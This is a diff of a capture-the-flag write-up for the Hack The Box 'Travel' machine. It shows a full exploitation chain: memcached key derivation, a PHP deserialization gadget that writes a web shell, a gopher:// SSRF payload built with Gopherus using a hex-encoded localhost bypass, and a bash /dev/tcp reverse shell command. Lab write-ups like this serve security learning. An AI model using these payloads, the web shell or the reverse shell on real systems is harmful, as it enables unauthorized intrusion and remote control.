@@ -305,13 +305,25 @@ Looking back at the source code of `Memcached.php`, I traced through what was go
 
 ![](../../.gitbook/assets/17-cache-handler-link.png)
 
-> Looking for usage of this method, we come across class-simplepie.php. $cache = $this-&gt;registry-&gt;call\('Cache', 'get\_handler', array\($this- cache\_location, call\_user\_func\($this-&gt;cache\_name\_function, $url\), 'spc'\)\); This script calls the get\_handler method with the parameters cache\_location \($location\), cache\_name\_function\($url\) \($filename\) and spc \($extension\). On searching for cache\_name\_function in the same script, we see that it is set to MD5.
+I spent awhile looking for the proper usage of this method, but finally came across Class-SimplePie.php. 
+
+```php
+$cache = $this->registry->call('Cache', 'get_handler', array($this- cache_location, call_user_func($this->cache_name_function, $url), 'spc')); 
+```
+
+This code calls the `get_handler()` function from `Cache.php` with the parameters `cache_location` ,`cache_name_function($url)`, and a filetype of `spc`. 
 
 ![](../../.gitbook/assets/17-cache-name.png)
 
-Inside the SimplePie class there was a small function that set `$cache_name_function` to `md5`.  
+After searching inside the SimplePie class for `$cache_name_function` I found a small function that set it  to `md5`.  
 
-The end result of all of this: it means that $filename \(later $name\) is set to md5\($url\) , while $extension \(later $type\) is set to spc . This gives me the information I need to create the memcached key to store my malicious payload in.  keyname = md5\(md5\(url\) + ":" + "spc"\) I verified this by using the original URL used of the page I ran debug on.
+_**The end result of all of this:**_ It means that `$filename` \(later `$name`\) is set to `md5($url)` , while `$extension` \(later `$type`\) is set to `spc` . This gives me the information I need to create the memcached key to store my malicious payload in.  the `__construct` method above gives the template. Some pseudo-code for this result is `key_name = md5sum( md5sum(url) + ':spc' )` I verified this by using the original URL of the page I ran debug on.
+
+{% hint style="info" %}
+_It took me a few tries to get the right URL.  First I tried just the part after **`/newsfeed/`**, then I forgot to add the **`http://`**.  The final working URL that matched the result I was looking for was **`http://www.travel.htb/newsfeed/customfeed.xml`**._
+{% endhint %}
+
+### Crafting the payload
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/travel]
@@ -323,52 +335,50 @@ The end result of all of this: it means that $filename \(later $name\) is set to
 4e5612ba079c530a6b1f148c0b352241  -
 ```
 
-This matches the output I saw in the debug code given by the system earlier! vuln confirmed
+The beginning of this resultant hash matches the output I saw in the debug code given by the `customfeed.xml` site earlier! 
 
-> In the SimplePie\_Cache\_Memcached class, we also see a load\(\) method that calls unserialize\(\).
+> In the Memcached.php class, I  also see a load\(\) method that calls unserialize\(\).
 >
-> We also need to find a class to craft a malicious object for. This is where the TemplateHelper class comes in. We can create a malicious object of this class and write a PHP file to the logs folder when it's unserialized. Use the following script to generate such an object. Note that the $file and $data variable should be made public as private variables can't be accessed directly while deserializing.
+>  Using this I can create a malicious object that will save a PHP file to the logs folder when it's deserialized. The TemplateHelper class comes in handy here. I mirrored this from the one in the earlier code.  Note: the $file and $data variable should be made public as private variables can't be accessed directly from outside the class.
 
-```text
+```php
 <?php
-class TemplateHelper
-{
-public $file;
-public $data;
-public function __construct(string $file, string $data)
-{
-$this->init($file, $data);
+class TemplateHelper {
+
+    public $file;
+    public $data;
+    
+    public function __construct(string $file, string $data) {
+        $this->init($file, $data);
+    }
+    public function __wakeup() {
+        $this->init($this->file, $this->data);
+    }
+    private function init(string $file, string $data) {
+        $this->file = $file;
+        $this->data = $data;
+        file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);
+    }
 }
-private function init(string $file, string $data)
-{
-$this->file = $file;
-$this->data = $data;
-file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);
-}
-}
+
 $back_door = new TemplateHelper("back_door.php", "<?php system(\$_REQUEST[test]); ?>");
+
 echo serialize($back_door);
+
 ?>
 ```
 
-> The script above serializes an object of the class TemplateHelper , which writes a webshell to shell.php on deserialization.
-
-### Crafting the payload
-
-```text
-┌──(zweilos㉿kali)-[~/htb/travel]
-└─$ php -f test.php
-PHP Warning:  file_put_contents(/home/zweilos/htb/travel/logs/back_door.php): failed to open stream: No such file or directory in /home/zweilos/htb/travel/test.php on line 14
-O:14:"TemplateHelper":2:{s:4:"file";s:13:"back_door.php";s:4:"data";s:28:"<?php system($_GET[test]);?>";}
-```
+This PHP script [serializes](https://www.w3schools.com/PHP/func_var_serialize.asp) an instance of the class `TemplateHelper`, which will write a my backdoor to a file called `back_door.php` in the `/jobs/` folder after deserialization.
 
 > Next, we need to set this payload as a value for the key xct\_4e5612ba079c530a6b1f148c0b352241 , so that it is deserialized when the server next fetches feeds.
 
-```text
+```php
 ┌──(zweilos㉿kali)-[~/htb/travel]
-└─$ php -f test.php                                                                                 1 ⨯
+└─$ php -f test.php
+                                                                                 1 ⨯
 PHP Warning:  file_put_contents(/home/zweilos/htb/travel/logs/back_door.php): failed to open stream: No such file or directory in /home/zweilos/htb/travel/test.php on line 14
 O:14:"TemplateHelper":2:{s:4:"file";s:13:"back_door.php";s:4:"data";s:34:"<?php system($_REQUEST['test']);?>";}                                                                                                        
+
 ┌──(zweilos㉿kali)-[~/htb/travel]
 └─$ Gopherus/gopherus.py --exploit phpmemcache
 
@@ -396,18 +406,26 @@ gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a
 -----------Made-by-SpyD3r-----------
 ```
 
-After that it took awhile to figure out where my `back_door.php` was located. I found a hint in the README.md file I had found in the git repository earlier: `* create logs directory in wp-content/themes/twentytwenty` I used dirbuster to find the exact directory, adding back\_door to my wordlist
+fixing and uploading final URL
 
 final url - the length of the contents is important! make sure it is correct \(111 in my case\)
+
+HAVE TO decimal/hex encode 127.0.0.1~~~!!! 2130706433 or 0x7f000001 and add xct\_ 
 
 ```text
 http://blog.travel.htb/awesome-rss/?custom_feed_url=gopher://0x7f000001:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20111%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:13:%22back_door.php%22%3Bs:4:%22data%22%3Bs:34:%22%3C%3Fphp%20system%28%24_REQUEST%5B%27test%27%5D%29%3B%3F%3E%22%3B%7D%0d%0a
 ```
 
-HAVE TO decimal/hex encode 127.0.0.1~~~!!! 2130706433 or 0x7f000001 and add xct\_ a shell can be obtained by using parameter:
+After that it took awhile to figure out where my `back_door.php` was located. I found a hint in the README.md file I had found in the git repository earlier: `* create logs directory in wp-content/themes/twentytwenty` after that the TemplateHelper class told me it was stored in the `/logs/` folder. 
+
+{% hint style="info" %}
+ If you look closely at the output when I ran my PHP code above, it tried to put the resultant file in the **`/home/zweilos/htb/travel/logs/`** which did not exist, so it gave an error.
+{% endhint %}
+
+a shell can be obtained by using parameter on the backdoor:
 
 ```text
-test=bash -c "bash -i >& /dev/tcp/10.10.15.53/8099 0>&1"
+http://blog.travel.htb/wp-content/themes/twentytwenty/logs/back_door.php?test=bash -c "bash -i >& /dev/tcp/10.10.15.53/8099 0>&1"
 ```
 
 `xct_4e5612ba079c530a6b1f148c0b352241`
